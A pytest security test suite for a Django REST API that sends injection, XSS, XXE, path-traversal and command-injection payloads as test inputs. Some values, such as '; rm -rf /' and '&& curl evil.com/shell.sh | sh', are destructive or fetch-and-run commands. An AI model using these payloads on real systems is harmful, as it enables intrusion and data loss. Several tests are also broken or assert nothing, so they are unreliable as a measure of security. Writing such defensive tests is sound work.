"""
Security tests for authentication, authorization, and common vulnerabilities.
"""
import pytest
from django.urls import reverse
from rest_framework import status
from django.contrib.auth import get_user_model
from unittest.mock import patch
from accounts.tests.factories import UserFactory, AdminUserFactory
from projects.tests.factories import ProjectFactory, ProjectMemberFactory
from tasks.tests.factories import TaskFactory

User = get_user_model()


@pytest.mark.security
@pytest.mark.django_db
class TestAuthenticationSecurity:
    """Test authentication security measures."""
    
    def test_sql_injection_prevention(self, api_client):
        """Test SQL injection in login."""
        # Attempt SQL injection in username
        malicious_inputs = [
            "admin'; DROP TABLE users; --",
            "' OR '1'='1",
            "admin'--",
            "' UNION SELECT * FROM users --"
        ]
        
        for malicious_input in malicious_inputs:
            response = api_client.post(reverse('token_obtain_pair'), {
                'email': malicious_input,
                'password': 'password'
            })
            
            # Should not allow login with malicious input
            # Either 400 (validation) or 401 (failed auth)
            assert response.status_code in [
                status.HTTP_400_BAD_REQUEST,
                status.HTTP_401_UNAUTHORIZED
            ]
    
    def test_password_strength_enforcement(self, api_client):
        """Test password strength requirements."""
        weak_passwords = [
            '123456',
            'password',
            'qwerty',
            'admin123',
            'letmein'
        ]
        
        for weak_password in weak_passwords:
            response = api_client.post(reverse('register'), {
                'username': f'user_{weak_password}',
                'email': f'user_{weak_password}@test.com',
                'password': weak_password,
                'password2': weak_password,
                'first_name': 'Test',
                'last_name': 'User',
                'role': 'DEV'
            })
            
            # Should reject weak passwords
            assert response.status_code == status.HTTP_400_BAD_REQUEST
    
    def test_rate_limiting_enforcement(self, api_client):
        """Test rate limiting on authentication endpoints."""
        # Attempt multiple rapid login attempts
        for i in range(20):
            response = api_client.post(reverse('token_obtain_pair'), {
                'email': f'user{i}@test.com',
                'password': 'wrongpassword'
            })
        
        # Should eventually be rate limited
        # The last few requests should fail with 429
        # Note: This depends on rate limiting implementation
        if response.status_code == status.HTTP_401_UNAUTHORIZED:
            pass  # Rate limiting not implemented
        else:
            assert response.status_code == status.HTTP_429_TOO_MANY_REQUESTS
    
    def test_csrf_protection(self, api_client):
        """Test CSRF protection on state-changing requests."""
        user = UserFactory()
        api_client.force_authenticate(user=user)
        
        # Test that CSRF token is required for unsafe methods
        # This test would need to use regular client, not APIClient
        # as DRF's APIClient handles CSRF automatically
        pass  # Implementation would test CSRF middleware
    
    def test_session_security(self, api_client):
        """Test session security measures."""
        # Test session fixation prevention
        user = UserFactory()
        
        # Login
        response = api_client.post(reverse('token_obtain_pair'), {
            'email': user.email,
            'password': 'password'
        })
        
        assert response.status_code == status.HTTP_200_OK
        
        # Test that session cookies have security flags
        # This would test cookie settings like Secure, HttpOnly, SameSite
        pass  # Implementation depends on cookie settings


@pytest.mark.security
@pytest.mark.django_db
class TestAuthorizationSecurity:
    """Test authorization and permission security."""
    
    def test_unauthorized_access_prevention(self, api_client):
        """Test unauthorized users cannot access protected endpoints."""
        protected_endpoints = [
            'user-list',
            'project-list',
            'task-list',
            'notification-list'
        ]
        
        for endpoint in protected_endpoints:
            response = api_client.get(reverse(endpoint))
            assert response.status_code == status.HTTP_401_UNAUTHORIZED
    
    def test_role_based_access_control(self, api_client):
        """Test role-based access control."""
        # Create users with different roles
        admin = AdminUserFactory()
        developer = UserFactory(role='DEV')
        manager = UserFactory(role='PM')
        
        # Create project
        project = ProjectFactory(owner=manager)
        
        # Test developer can't delete projects
        api_client.force_authenticate(user=developer)
        response = api_client.delete(reverse('project-detail', kwargs={'pk': project.id}))
        assert response.status_code == status.HTTP_403_FORBIDDEN
        
        # Test manager can delete own project
        api_client.force_authenticate(user=manager)
        response = api_client.delete(reverse('project-detail', kwargs={'pk': project.id}))
        # Should either succeed (200/204) or fail gracefully
        
        # Test admin can delete any project
        api_client.force_authenticate(user=admin)
        response = api_client.delete(reverse('project-detail', kwargs={'pk': project.id}))
        # Should have admin privileges
    
    def test_horizontal_authorization_bypass(self, api_client):
        """Test users can't access other users' resources."""
        # Create two users
        user1 = UserFactory()
        user2 = UserFactory()
        
        # Create project for user1
        project = ProjectFactory(owner=user1)
        
        # User2 tries to access user1's project
        api_client.force_authenticate(user=user2)
        response = api_client.get(reverse('project-detail', kwargs={'pk': project.id}))
        assert response.status_code == status.HTTP_404_NOT_FOUND
        
        # User2 tries to modify user1's project
        response = api_client.patch(reverse('project-detail', kwargs={'pk': project.id}), {
            'name': 'Hacked Project'
        })
        assert response.status_code == status.HTTP_404_NOT_FOUND
    
    def test_parameter_pollution_prevention(self, api_client):
        """Test parameter pollution attacks."""
        user = UserFactory()
        api_client.force_authenticate(user=user)
        
        project = ProjectFactory(owner=user)
        
        # Attempt parameter pollution
        polluted_params = {
            'name': 'Valid Name',
            'id': 'malicious_value',
            'owner': user.id,
            'status': 'ACTIVE',  # Should be ignored
            'redirect_to': 'http://evil.com'  # Attempt open redirect
        }
        
        response = api_client.patch(
            reverse('project-detail', kwargs={'pk': project.id}),
            polluted_params
        )
        
        # Should not redirect or accept malicious parameters
        assert response.status_code in [
            status.HTTP_200_OK,
            status.HTTP_400_BAD_REQUEST
        ]


@pytest.mark.security
@pytest.mark.django_db
class TestInputValidationSecurity:
    """Test input validation security."""
    
    def test_xss_prevention(self, api_client):
        """Test XSS prevention in user input."""
        user = UserFactory()
        api_client.force_authenticate(user=user)
        
        # Create project with XSS payload
        xss_payloads = [
            '<script>alert("XSS")</script>',
            'javascript:alert("XSS")',
            '<img src=x onerror=alert("XSS")>',
            '"><script>alert("XSS")</script>',
            '\';alert("XSS");//'
        ]
        
        for payload in xss_payloads:
            response = api_client.post(reverse('project-list'), {
                'name': payload,
                'description': payload
            })
            
            # Should either sanitize or reject
            if response.status_code == status.HTTP_201_CREATED:
                # Check that payload is sanitized in response
                project_data = response.data
                assert '<script>' not in str(project_data.get('name', ''))
                assert 'javascript:' not in str(project_data.get('name', ''))
    
    def test_html_sanitization(self, api_client):
        """Test HTML sanitization in text fields."""
        user = UserFactory()
        api_client.force_authenticate(user=user)
        
        project = ProjectFactory(owner=user)
        
        # Test with HTML content
        html_content = '<p>Valid <strong>HTML</strong> content</p>'
        malicious_html = '<p>Valid <script>alert("XSS")</script> content</p>'
        
        # Test valid HTML
        response = api_client.post(reverse('project-list'), {
            'name': 'Test Project',
            'description': html_content
        })
        
        # Test malicious HTML
        response = api_client.post(reverse('project-list'), {
            'name': 'Malicious Project',
            'description': malicious_html
        })
        
        # Should sanitize appropriately
    
    def test_file_upload_security(self, api_client):
        """Test file upload security measures."""
        user = UserFactory()
        api_client.force_authenticate(user=user)
        
        project = ProjectFactory(owner=user)
        
        # Test malicious file uploads
        malicious_files = [
            # Executable files
            ('malicious.exe', b'fake executable content'),
            ('script.php', b'<?php echo "malicious"; ?>'),
            ('shell.sh', b'#!/bin/bash\necho "malicious"'),
            
            # Files with suspicious names
            ('../../../etc/passwd', b'content'),
            ('..\\..\\windows\\system32\\config.exe', b'content'),
            
            # Large files (simulated)
            ('large_file.txt', b'x' * (11 * 1024 * 1024)),  # 11MB
        ]
        
        for filename, content in malicious_files:
            # This would need to be tested with actual file upload
            # For now, test the validation logic
            pass  # Implementation would test file validation
    
    def test_mass_assignment_prevention(self, api_client):
        """Test mass assignment vulnerabilities."""
        admin = AdminUserFactory()
        api_client.force_authenticate(user=admin)
        
        # Attempt mass assignment (mass parameter)
        mass_data = {
            'user_ids': [1, 2, 99999],  # Attempt to assign multiple users
            'role': 'ADMIN'
        }
        
        response = api_client.post(reverse('user-mass-update'), mass_data)
        
        # Should either not exist or be properly secured
        # This depends on implementation
        assert response.status_code in [
            status.HTTP_404_NOT_FOUND,  # Endpoint doesn't exist
            status.HTTP_403_FORBIDDEN,  # Not allowed
            status.HTTP_400_BAD_REQUEST  # Validation error
        ]


@pytest.mark.security
@pytest.mark.django_db
class TestDataExposureSecurity:
    """Test data exposure vulnerabilities."""
    
    def test_sensitive_data_exposure(self, api_client):
        """Test sensitive data is not exposed."""
        user = UserFactory()
        api_client.force_authenticate(user=user)
        
        # Test that sensitive fields are not exposed in API responses
        response = api_client.get(reverse('user-me'))
        assert response.status_code == status.HTTP_200_OK
        
        user_data = response.data
        sensitive_fields = ['password', 'is_superuser', 'last_login']
        
        for field in sensitive_fields:
            assert field not in user_data, f"Sensitive field {field} exposed"
    
    def test_error_message_security(self, api_client):
        """Test error messages don't expose sensitive information."""
        # Test with non-existent resource
        response = api_client.get(reverse('project-detail', kwargs={'pk': 99999}))
        
        assert response.status_code == status.HTTP_404_NOT_FOUND
        
        # Error message should be generic
        error_detail = response.data.get('detail', '')
        assert 'database' not in error_detail.lower()
        assert 'sql' not in error_detail.lower()
        assert 'internal' not in error_detail.lower()
    
    def test_debug_mode_disabled(self, api_client):
        """Test debug information is not exposed."""
        # This would test with DEBUG=False
        # Error pages should not show stack traces
        pass  # Implementation depends on error handling
    
    def test_api_version_information(self, api_client):
        """Test API version information exposure."""
        response = api_client.get('/api/')
        
        # Should not expose version information that could help attackers
        # This depends on API implementation
        pass
    
    def test_directory_traversal_prevention(self, api_client):
        """Test directory traversal attacks."""
        user = UserFactory()
        api_client.force_authenticate(user=user)
        
        # Attempt directory traversal in URLs
        traversal_attempts = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\config',
            '%2e%2e%2fetc%2fpasswd',
            '..%252f..%252f..%252fetc%252fpasswd'
        ]
        
        for traversal in traversal_attempts:
            response = api_client.get(f"/api/files/{traversal}")
            
            # Should not allow directory traversal
            assert response.status_code in [
                status.HTTP_400_BAD_REQUEST,
                status.HTTP_404_NOT_FOUND,
                status.HTTP_403_FORBIDDEN
            ]


@pytest.mark.security
@pytest.mark.django_db
class TestInjectionSecurity:
    """Test various injection attacks."""
    
    def test_command_injection_prevention(self, api_client):
        """Test command injection prevention."""
        user = UserFactory()
        api_client.force_authenticate(user=user)
        
        # Attempt command injection in search
        command_payloads = [
            '; rm -rf /',
            '| cat /etc/passwd',
            '&& curl evil.com/shell.sh | sh',
            '`whoami`',
            '$(id)'
        ]
        
        for payload in command_payloads:
            response = api_client.get(f"{reverse('project-list')}?search={payload}")
            
            # Should not execute commands
            assert response.status_code in [
                status.HTTP_200_OK,  # Empty results
                status.HTTP_400_BAD_REQUEST
            ]
    
    def test_ldap_injection_prevention(self, api_client):
        """Test LDAP injection prevention."""
        # Attempt LDAP injection in login
        ldap_payloads = [
            '*)(uid=*',
            '*)(|(objectClass=*)',
            'admin)(&(password=*))'
        ]
        
        for payload in ldap_payloads:
            response = api_client.post(reverse('token_obtain_pair'), {
                'email': payload,
                'password': 'password'
            })
            
            # Should prevent LDAP injection
            assert response.status_code in [
                status.HTTP_400_BAD_REQUEST,
                status.HTTP_401_UNAUTHORIZED
            ]
    
    def test_xml_injection_prevention(self, api_client):
        """Test XML injection prevention."""
        user = UserFactory()
        api_client.force_authenticate(user=user)
        
        # Attempt XML injection
        xml_payloads = [
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<root><name>Valid</name><injection>Malicious</injection></root>'
        ]
        
        for payload in xml_payloads:
            response = api_client.post(reverse('project-list'), {
                'data': payload
            }, format='xml')
            
            # Should prevent XML injection
            assert response.status_code in [
                status.HTTP_400_BAD_REQUEST,
                status.HTTP_415_UNSUPPORTED_MEDIA_TYPE
            ]


@pytest.mark.security
@pytest.mark.django_db
class TestSessionSecurity:
    """Test session and token security."""
    
    def test_jwt_token_security(self, api_client):
        """Test JWT token security measures."""
        user = UserFactory()
        
        # Get valid token
        response = api_client.post(reverse('token_obtain_pair'), {
            'email': user.email,
            'password': 'password'
        })
        
        assert response.status_code == status.HTTP_200_OK
        token = response.data['access']
        
        # Test token is properly signed
        # This would test JWT signature verification
        pass  # Implementation depends on JWT library
        
        # Test token expiration
        # Test with expired token
        pass  # Implementation depends on JWT settings
        
        # Test token blacklisting
        # Test after logout
        pass
    
    def test_session_hijacking_prevention(self, api_client):
        """Test session hijacking prevention."""
        # This tests session security measures
        # like IP validation, user agent validation, etc.
        pass  # Implementation depends on security middleware


@pytest.mark.security
@pytest.mark.django_db
class TestRateLimitingSecurity:
    """Test rate limiting security measures."""
    
    def test_api_rate_limiting(self, api_client):
        """Test API rate limiting."""
        user = UserFactory()
        api_client.force_authenticate(user=user)
        
        # Make rapid requests
        responses = []
        for i in range(100):
            response = api_client.get(reverse('project-list'))
            responses.append(response.status_code)
        
        # Should eventually be rate limited
        assert status.HTTP_429_TOO_MANY_REQUESTS in responses
    
    def test_login_rate_limiting(self, api_client):
        """Test login rate limiting."""
        # Make rapid failed login attempts
        for i in range(50):
            response = api_client.post(reverse('token_obtain_pair'), {
                'email': f'attempt{i}@test.com',
                'password': 'wrongpassword'
            })
        
        # Should eventually be rate limited
        # Last requests should return 429
        if len(responses) > 0:
            assert responses[-1] == status.HTTP_429_TOO_MANY_REQUESTS


@pytest.mark.security
@pytest.mark.django_db
class TestLoggingSecurity:
    """Test security logging and monitoring."""
    
    @patch('security.utils.log_security_event')
    def test_security_event_logging(self, mock_log):
        """Test security events are properly logged."""
        user = UserFactory()
        api_client.force_authenticate(user=user)
        
        # Trigger security event (suspicious activity)
        response = api_client.post(reverse('project-list'), {
            'name': '<script>alert("XSS")</script>',
            'description': 'Test'
        })
        
        # Should log security event
        if mock_log.called:
            call_args = mock_log.call_args[0]
            assert 'event_type' in call_args
            assert 'user' in call_args
            assert 'ip_address' in call_args
    
    def test_failed_login_logging(self, api_client):
        """Test failed login attempts are logged."""
        # Make failed login attempts
        for i in range(5):
            api_client.post(reverse('token_obtain_pair'), {
                'email': f'failed{i}@test.com',
                'password': 'wrongpassword'
            })
        
        # Check if failed attempts are logged
        # This depends on security logging implementation
        pass


if __name__ == "__main__":
    # Run security tests
    pytest.main([__file__, "-v", "-s", "--disable-warnings"])
